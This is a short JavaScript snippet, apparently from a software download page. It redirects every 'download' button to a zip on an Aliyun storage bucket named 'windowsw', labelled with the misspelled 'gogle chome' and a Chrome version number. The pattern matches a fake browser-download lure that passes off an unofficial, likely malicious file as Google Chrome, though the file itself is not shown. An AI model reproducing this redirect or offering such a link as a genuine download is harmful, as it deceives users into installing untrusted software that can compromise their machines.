window.onload = function() {
    // 下载链接
    let url = 'https://windowsw.oss-cn-hongkong.aliyuncs.com/gogle%20chome%2064%E4%BD%8D_109.0.5414.zip'

    document.querySelectorAll('.download').forEach(item => {
        item.onclick = function() {
            location.href = url
        }
    })
}